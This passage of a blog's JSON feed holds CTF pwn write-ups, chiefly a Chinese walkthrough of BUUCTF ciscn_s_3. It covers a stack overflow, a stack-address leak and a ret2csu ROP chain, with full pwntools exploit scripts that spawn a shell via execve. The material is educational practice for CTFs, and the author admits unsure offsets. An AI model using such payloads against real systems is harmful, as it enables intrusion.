operator\">=</span><span class=\"token number\">0xDEADBAAD</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Enter your input> \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>function1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>function2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>a1_function2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>a1_flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://s1.ax1x.com/2023/09/10/pPcb9dH.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/BUUCTF/ciscn_s_3/",
            "url": "https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/BUUCTF/ciscn_s_3/",
            "title": "ciscn_s_3（利用系统调用+ret2csu）",
            "date_published": "2023-05-04T11:33:55.000Z",
            "content_html": "<h1 id=\"ciscn_s_3\"><a class=\"anchor\" href=\"#ciscn_s_3\">#</a> ciscn_s_3</h1>\n<h3 id=\"1下载附件后查看程序信息\"><a class=\"anchor\" href=\"#1下载附件后查看程序信息\">#</a> 1. 下载附件后查看程序信息</h3>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6sKKK.png\" alt=\"\" /></p>\n<p>可以看到是 64 位程序，并且开启了 NX</p>\n<h3 id=\"2利用ida反汇编\"><a class=\"anchor\" href=\"#2利用ida反汇编\">#</a> 2. 利用 ida 反汇编</h3>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6s85d.md.png\" alt=\"\" /></p>\n<p>发现有个 vul 函数，进入查看</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6sJPA.png\" alt=\"\" /></p>\n<p>发现是 sys_read 函数，并且可以通过 <strong>sys_read 溢出</strong>，查看汇编代码</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6sY8I.png\" alt=\"\" /></p>\n<p>发现有 syscall，由此判断是系统调用，那么我们通过 <strong>控制寄存器</strong> 的方式来进行系统调用然后 getshell</p>\n<h3 id=\"3漏洞利用分析\"><a class=\"anchor\" href=\"#3漏洞利用分析\">#</a> 3. 漏洞利用分析</h3>\n<p>此处放上之前的文章：<a href=\"https://vvwwvv.cn/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/\" title=\"Linux之系统调用\">https://vvwwvv.cn/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</a></p>\n<p>上面链接里能看到 64 位系统的系统调用号，找到 execve 命令是 59（0x3b）</p>\n<pre><code class=\"language-C\">\nint execve(const char *filename, char *const argv[], char *const envp[]);\n\n//const char *filename 为要执行文件的地址\n\n//char *const argv[]：传递给程序的完整参数列表，包括argv[0]，它一般是程序的名\n\n//char *const envp[]：一般传递NULL，表示可变参数的结尾。\n\n</code></pre>\n<p>我们要执行的是  <code>execve(&quot;/bin/sh&quot;,0,0)</code>  来 getshell</p>\n<h3 id=\"4控制寄存器\"><a class=\"anchor\" href=\"#4控制寄存器\">#</a> 4. 控制寄存器</h3>\n<p>将 0x3b 存入 rax 寄存器，64 位系统调用寄存器顺序依次为：rdi，rsi，rdx</p>\n<p>本想着通过 Ropgadgets 查找对应寄存器构造 rop 链</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6sHR1.png\" alt=\"\" /></p>\n<p>但是发现无法控制 rax 寄存器与 rdx 寄存器，所以要使用其他方法</p>\n<p>查看汇编发现有个 gadgets 函数，但是不知道为什么在代码流程图里没有显示后面的部分</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6sxde.png\" alt=\"\" /></p>\n<p>此处看到 0x3b 存入了 rax，正好是 execve 的系统调用号 (也可以在 ida 窗口中按 alt+t 查找 mov rax,3bh 指令，找到指令存储位置为 0x4004E2)</p>\n<p>接着需要控制相应的传参寄存器，rdi，rsi，rdx，rcx, r8, r9。因为可以溢出的字符很多，那么我们可以利用   <strong>csu_init（ret2csu）</strong>  这一段代码，因为 64 位程序需要该函数对 libc 进行初始化，一般的程序都会调用 libc 函数，所以 <strong>一定存在</strong> 这个函数，并且该函数先于 main 函数执行</p>\n<p>原理:<a href=\"https://vvwwvv.cn/2023/08/24/pwn/ROP/ret2csu\" title=\"64位构造通用ROP\">https://vvwwvv.cn/2023/08/24/pwn/ROP/ret2csu</a></p>\n<h4 id=\"5构造rop\"><a class=\"anchor\" href=\"#5构造rop\">#</a> 5. 构造 rop</h4>\n<p>通过 ida 可以找到 csu 段地址，下面为 gadgets1</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pPcCbss.png\" alt=\"\" /></p>\n<p>当我们进入 gadgets1 时，执行了 add rsp ,8 所以要填充 8 个字符，后续的 rbx 要为 0 才能不跳转，rbp 为 1 使其与后续加 1 后的 rbx 相同，r12 不需要所以可以任意，r13，r14，r15 分别会在 gadgets2 控制 rdx，rsi，rdi，填入我们需要的值，具体值如下：</p>\n<ul>\n<li>rbx=0</li>\n<li>rbp=1</li>\n<li>r12=0</li>\n<li>r13=0  （对应 rdx=0）</li>\n<li>r14=0  （对应 rsi=0）</li>\n<li>r15=&quot;binsh&quot; 的地址  （对应 rdi=&quot;/bin/sh&quot;）</li>\n</ul>\n<p>此处执行的是  <code>execve(&quot;/bin/sh&quot;,0,0)  </code>  execve( rdi , rsi , rdx )</p>\n<p>由此我们需要找到 &quot;/bin/sh&quot; 地址，由于程序内找不到 &quot;/bin/sh&quot; , 所以需要我们自己写入 &quot;/bin/sh&quot;</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pPcCjoV.png\" alt=\"\" /></p>\n<p>由上面的图可以看到，sys_wrtie 会输出 0x30 个字符，而 buf 在栈上只有 0x10 的大小，后面紧接着的 0x10 为 ret 和初始的 rbp 所占空间，后面 8 个字符为栈上的某一地址， <strong>利用该地址减去与 &quot;/bin/sh&quot; 地址的偏移量</strong> 即可获得 &quot;/bin/sh&quot; 地址。（这里是因为开启了保护每次在栈上的地址不同，而偏移是不会变的）</p>\n<p><strong>查看方式 1</strong></p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pPcii9S.png\" alt=\"\" /></p>\n<p>由上面的图片可以看出输入的字符串的地址（这里因为溢出所以应该为 ddf0），而看到距离 rsp 为 0x20 的地方输出了我们调试的程序的名称，这个一般是保存在 avrg [0]，这个是栈上的地址</p>\n<p><strong>查看方式 2</strong></p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pPcFrGT.png\" alt=\"\" /></p>\n<p>首先为写入的 buf 地址，然后在 0x20 大小后为栈地址，原因入下图，因此通过 sys_write 即可泄露</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pPcAxxS.png\" alt=\"\" /></p>\n<p>由于开启了保护所以写入栈的位置是不固定的，但是可以通过当此运行时泄露的栈地址减去固定的偏移量即可得到写入的字符串地址</p>\n<h3 id=\"7字符串地址计算方法\"><a class=\"anchor\" href=\"#7字符串地址计算方法\">#</a> 7. 字符串地址计算方法:</h3>\n<p>通过上面的 0x7fffffffdf38-0x7fffffffddf0=0x148 , 在计算栈的偏移时是 0x148（不知道是不是因为计算错误），但是线上靶场的环境栈的偏移是 0x118。</p>\n<p>在本地可以利用 patchelf 切换 libc 版本</p>\n<pre><code>patchelf --set-interpreter ~/Tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so --set-rpath ~/Tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ ./ciscn_s_3\n</code></pre>\n<p>有了偏移之后就可以通过偏移量来计算输入的字符串地址：</p>\n<p><strong>输入字符串地址 = 泄露的栈地址 - 0x118</strong></p>\n<p>至此就得到了 &quot;/bin/sh&quot; 地址</p>\n<h3 id=\"8构造exp\"><a class=\"anchor\" href=\"#8构造exp\">#</a> 8. 构造 exp</h3>\n<p>因为 &quot;/bin/sh&quot; 占 7 个字节，需要改成 &quot;/bin/sh\\x00&quot; 来用隔断符来满足 8 个字节进行对齐</p>\n<p>先执行 syscall 还是先到 gadgets:</p>\n<p>先 gadgets 最后返回到 syscall</p>\n<p>系统调用号与 syscall 之间的执行顺序：</p>\n<p>系统调用号执行后返回到 syscall，参数都在前面</p>\n<p>exp：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26711</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./ciscn_s_3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>main<span class=\"token operator\">=</span><span class=\"token number\">0x04004ED</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>execve<span class=\"token operator\">=</span><span class=\"token number\">0x0004004E2</span> <span class=\"token comment\">#mov rax,3BH; ret;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>syscall<span class=\"token operator\">=</span><span class=\"token number\">0x000400501</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>gadgets1<span class=\"token operator\">=</span><span class=\"token number\">0x000040059a</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>gadgets2<span class=\"token operator\">=</span><span class=\"token number\">0x0000400580</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>rdi_ret<span class=\"token operator\">=</span><span class=\"token number\">0x004005a3</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">csu</span><span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">,</span>rbp<span class=\"token punctuation\">,</span>r12<span class=\"token punctuation\">,</span>r13<span class=\"token punctuation\">,</span>r14<span class=\"token punctuation\">,</span>r15<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    payload<span class=\"token operator\">=</span><span class=\"token string\">b\"/bin/sh\\x00\"</span><span class=\"token operator\">+</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>gadgets1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbp<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r12<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r13<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r14<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r15<span class=\"token punctuation\">)</span> <span class=\"token comment\">#此处 r15 的值可有可无，因为后面仍然调用 rdi_ret 来传参</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    payload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>gadgets2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>execve<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"/bin/sh\\x00\"</span><span class=\"token operator\">+</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 此处之间填充到 ret，没有考虑 rbp，gdb 中调试就可以发现</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>binsh<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">0x118</span> <span class=\"token comment\">#减去偏移获得 \"/bin/sh\" 地址</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>csu<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>binsh<span class=\"token operator\">+</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>binsh<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 这里的 binsh+0x50 是传入字符串 \"/bin/sh\" 后开始，到 p64（execve）</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\">#p.recv()</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>借用别人的一张图理解 binsh+0x50<br />\n<img data-src=\"https://img-blog.csdnimg.cn/20210423174224878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpZXlpY2hlbnNzcw==,size_16,color_FFFFFF,t_70\" alt=\"\" /></p>\n<p>参考：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9aTEZ4RA==\">http://t.csdn.cn/ZLFxD</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9TU1k5bw==\">http://t.csdn.cn/SSY9o</span></p>\n<p>注意：不知道是不是因为部分地方没写对，用之前的 csu 方法有点问题，总要 binsh+0x50 才可以</p>\n",
            "tags": [
                "pwn",
                "ret2csu",
                "ctf",
                "系统调用"
            ]
        }
    ]
}